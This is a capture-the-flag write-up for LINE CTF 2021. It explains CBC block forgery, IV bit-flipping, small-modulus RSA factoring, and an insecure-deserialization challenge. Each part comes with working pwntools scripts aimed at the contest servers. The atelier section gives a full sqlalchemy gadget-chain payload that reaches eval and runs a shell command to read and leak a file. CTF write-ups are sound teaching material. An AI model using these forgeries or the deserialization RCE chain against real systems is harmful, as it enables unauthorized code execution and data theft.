# LINE CTF 2021

## babycrypto1

Our goal is to find `encrypt("<TOKEN>show")`.
We know `encrypt("<TOKEN>test")`.
We get to encrypt an arbitrary IV/plaintext, but do not know the token, so we cannot immediately encrypt what we want.
However, "<TOKEN>" is block-aligned, which means that "test"/"show" will be in their own block, along with 12 0xCs to pad the block.
Since the encryption mode is CBC, we can use the previos blocks ciphertext as our IV, and "show" and 12 0xCs as our plaintext.
This will give us the last block of encrypt("<TOKEN>show") which we are after, and the prior blocks will be correct.

```py
import base64

import pwn

pwn.context.log_level = "DEBUG"

remote = pwn.remote("35.200.115.41", 16001)

remote.readuntil("test Command: ")
test_command = base64.b64decode(remote.readline())
for i in range(0, len(test_command), 16):
    print(" ".join(bytes([b]).hex() for b in test_command[i : i + 16]))

remote.readuntil("IV...: ")
iv = test_command[-32:-16]
remote.sendline(base64.b64encode(iv))

remote.readuntil("Message...: ")
message = b"show" + (b"\x0c" * 0xC)
assert len(message) == 16
remote.sendline(base64.b64encode(message))

remote.readuntil("Ciphertext:")
ciphertext = base64.b64decode(remote.readline())
print(ciphertext)

remote.readuntil("Enter your command: ")
command = test_command[:-16] + ciphertext[16:32]
remote.sendline(base64.b64encode(command))

decrypted = remote.readline()
remote.readall()

remote.close()
```

## babycrypto2

This time we do not get to perform an arbitrary encryption, and the part we want to change has moved to the first block.
We are given `encrypt("Command: test<TOKEN>")`, and need to find `encrypt("Command: show<TOKEN>")`.
All we need to do is modify the IV, which during decryption in CBC mode is XOR-ed with the output of our raw decyption function (AES) to create the plaintext.
This means we can just XOR the given IV with the XOR-difference of what we want to modify the string to.

```py
import base64

import pwn

pwn.context.log_level = "DEBUG"

remote = pwn.remote("35.200.39.68", 16002)

remote.readuntil("test Command: ")
test_command = base64.b64decode(remote.readline())
for i in range(0, len(test_command), 16):
    print(" ".join(bytes([b]).hex() for b in test_command[i : i + 16]))

remote.readuntil("Enter your command: ")
command = bytearray(test_command)
command[9] ^= ord("t") ^ ord("s")
command[10] ^= ord("e") ^ ord("h")
command[11] ^= ord("s") ^ ord("o")
command[12] ^= ord("t") ^ ord("w")
command = bytes(command)
remote.sendline(base64.b64encode(command))

decrypted = remote.readline()
remote.readall()

remote.close()
```

## babycrypto3

We are given an RSA public key and ciphertext.
Our goal is to decrypt the ciphertext.
In order to do so, we will need to create the accompanying private key.
If we can factor N, which is relatively small, we can do this.
Here, we can use [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) to carry out the simple attack

```sh
RsaCtfTool/RsaCtfTool.py --publickey pub.pem --uncipherfile ciphertext.txt --private --dumpkey

[*] Testing key pub.pem.
[*] Performing smallq attack on pub.pem.
[*] Performing factordb attack on pub.pem.

Results for pub.pem:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIHwAgEAAjIDKLFBOaLlS4ikZi8aZ8w6zRkpybYnlLtkkWr/ApkfgEVuTQ7tTVkd
93CNWvLptPtWiQIDAQABAjICVAvRt1mJB5M/GNG+9KJi9KfVTodWepq+LoV+XT43
BsJv1O/OxeJojLptyGSSRvz7AQISA1kgMn4Vo00zcOayHTjpHk9NAiEA8YjGfmbv
fvmyql5zXbcSOQFHFqj95pAWZ899Rr1d/i0CEXrR+UpF8XuLhn8YQMW56eT1AiEA
p6yD34wmBsfhOFSJUi2dAOXaK+j1GfI9G6P3G/yqG6ECET2kkuQtW5em9EJrX3Qu
z25m
-----END RSA PRIVATE KEY-----
n: 31864103015143373750025799158312253992115354944560440908105912458749205531455987590931871433911971516176954193675507337
e: 65537
d: 23485414835031898402753348528970125529626544212819723005551810422923054686389503823111729154316627780927042523559164673
p: 291664785919250248097148750343149685985101
q: 109249057662947381148470526527596255527988598887891132224092529799478353198637

Public key details for pub.pem
n: 31864103015143373750025799158312253992115354944560440908105912458749205531455987590931871433911971516176954193675507337
e: 65537

Unciphered data :
HEX : 0x00026067ff851ecdcb61e50b83a515e3005130785055306c4f527942555345556752456c545645464f5130557543673d3d0a
INT (big endian) : 93642291186863225015737472848315771398135057931473251341587231211471564868517709899464755625073676430723959035346186
INT (little endian) : 103282109084838500432492642512020353948670062101186628291674723746246989709418757052122829802325798084932713167175287296
STR : b'\x00\x02`g\xff\x85\x1e\xcd\xcba\xe5\x0b\x83\xa5\x15\xe3\x00Q0xPU0lORyBUSEUgRElTVEFOQ0UuCg==\n'
```
```py
In [1]: import base64
In [2]: base64.b64decode('Q0xPU0lORyBUSEUgRElTVEFOQ0UuCg==')
Out[2]: b'CLOSING THE DISTANCE.\n'
```

## atelier

This challenge is super interesting.
We are given the client to a custom object serialization/deserialization server.
Objects are serialized into JSON, where their `__dict__` forms the basis for a dict, and the object's `__class__` and `__module__` are also included.
In order to deserialize, `__module__` is dynamically imported, and `__class__` accessed from that module.
The class is instanitiated with `__new__`, and then the object's `__dict__` updated with the remaining elements.
Amazing.
We also know that the server has access to `sqlalchemy`, which means that we can serialize/deserialize classes from that package.
The server is really only interested in serializing/deserializing super simple objects: `MaterialRequest` and `RecipeCreateRequest`, the latter of which has a `materials` element which is a string.
This `materials` string is comma-separated values which are accessed by calling `obj.materials.split(",")`.
This is inferred through black-box experimentation against the server, and reasoning about it's error messages.

We can supply the server with a custom `RecipeCreateRequest`, with a custom (non-string) `materials` attribute to begin the insanity.
Here, I make materials be a `sqlalchemy.Date`, for no reason in particular, other than that it is a simple class which I can tack more attributes onto.

Then I make that object contain a `split` attribute, which is a `sqlalchemy.testing.exclusions.BooleanPredicate`.
This class defines a `__call__`, which is what will be our implementation for `split(",")`:
```py
    def __call__(self, config):
        return self.value
```
This implementation is useful because it takes in 1 parameter, which is what our interface is expecting (to consume the `","`).
Further, it returns some arbitrary `self.value`, which we can control.
As a result, we gain control over the resulting output of `obj.materials.split(",")`, and may continue.

Through black-box experimentation with the server, reasoning about it's error messages, we know that elements of the `split` output are being accessed, e.g. `obj.materials.split(",")[0]` and `obj.materials.split(",")[1]`.
In order to control this, we can abuse `__getitem__`.
Here, we use `sqlalchemy.orm.identity.WeakInstanceDict`:
```py
    def __getitem__(self, key):
        state = self._dict[key]
        o = state.obj()
        if o is None:
            raise KeyError(key)
        return o
```
Again, we can control `_dict` (because we can arbitrarily control attributes).
Given this implementation, it will access into our `_dict` with `_dict[0]`/`_dict[1]`.
Then it will access `.obj` on that object, and call it.
This primitive allows us to convert an item access, which we have, into a function call (with no parameters).

Again, we use `sqlalchemy.Date` as simple objects to hold attributes.
Here, we need it to hold our `obj` attribute, which will be used by the prior primitive.

At this point the entrypoint into our next gadget is a `__call__` with no arguments passed.
We make the `obj`, which is called, be a `sqlalchemy.ext.declarative.clsregistry._class_resolver`.
This class defines an extremely powerful primitive for us:
```py
    def __call__(self):
        try:
            x = eval(self.arg, globals(), self._dict)

            if isinstance(x, _GetColumns):
                return x.cls
            else:
                return x
        except NameError as n:
            self._raise_for_name(n.args[0], n)
```
Using this, we reach arbitrary code execution, through our control of `self.arg`, and can complete the challenge.
We convert the `eval` into an `exec` to get more than a single expression (by simply calling `exec` with a passed in string).
Raising an `Exception` seems to be the simplest data exfiltation method, and so we set `self.arg` to `"""exec('import subprocess; raise Exception(subprocess.check_output(["cat", "flag"]))')"""`

All together, this is our final payload:
```py
message = {
    "__class__": "RecipeCreateRequest",
    "__module__": "__main__",
    "materials": {
        "__class__": "Date",
        "__module__": "sqlalchemy",
        "split": {
            "__class__": "BooleanPredicate",
            "__module__": "sqlalchemy.testing.exclusions",
            "value": {
                "__class__": "WeakInstanceDict",
                "__module__": "sqlalchemy.orm.identity",
                "_dict": [
                    {
                        "__class__": "Date",
                        "__module__": "sqlalchemy",
                        "obj": {
                            "__class__": "_class_resolver",
                            "__module__": "sqlalchemy.ext.declarative.clsregistry",
                            "arg": "'sparkling powder'",
                            "_dict": {},
                        },
                    },
                    {
                        "__class__": "Date",
                        "__module__": "sqlalchemy",
                        "obj": {
                            "__class__": "_class_resolver",
                            "__module__": "sqlalchemy.ext.declarative.clsregistry",
                            "arg": """exec('import subprocess; raise Exception(subprocess.check_output(["cat", "flag"]))')""",
                            "_dict": {},
                        },
                    },
                ],
            },
        },
    },
}
```
